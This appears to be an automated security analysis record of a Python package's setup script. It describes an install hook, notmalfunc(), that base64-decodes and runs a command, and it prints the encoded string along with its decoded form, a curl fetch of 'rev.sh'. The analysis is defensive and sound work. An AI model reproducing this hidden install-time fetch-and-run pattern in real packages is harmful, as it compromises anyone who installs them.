  "purpose": "Define a setup configuration for a Python package that includes a potentially malicious payload.",
  "sources": "Base64-encoded string in b64d function, executed during installation via notmalfunc() in AfterInstall class.",
  "sinks": "os.system call executing decoded base64 content, which downloads data from a remote URL.",
  "flows": "During package installation, AfterInstall.run() calls notmalfunc(), decoding base64 to execute a remote HTTP request.",
  "anomalies": "Use of base64 decoding to obfuscate URL execution, execution of system command during installation, no validation or sanitization.",
  "analysis": "The code defines a setup script that registers custom install and develop commands. The notmalfunc() function decodes a base64 string 'Y3VybCBodHRwOi8vbG9jYWxob3N0L3Jldi5zaAo=' which decodes to 'curl http://localhost/rev.sh'. This command is executed during the install process via os.system, potentially downloading and executing remote malicious code or scripts. The use of base64 encoding to hide the URL and the remote execution during installation strongly indicates malicious intent. No other suspicious behaviors such as credential handling, obfuscation beyond base64, or hidden backdoors are observed. The code is straightforward but deliberately obfuscated intent to execute remote commands upon install.",
  "conclusion": "This package contains a malicious payload that executes a remote script during installation by decoding and executing a base64-encoded command. The code uses obfuscation to hide this behavior and poses a significant security risk. It should not be used.",
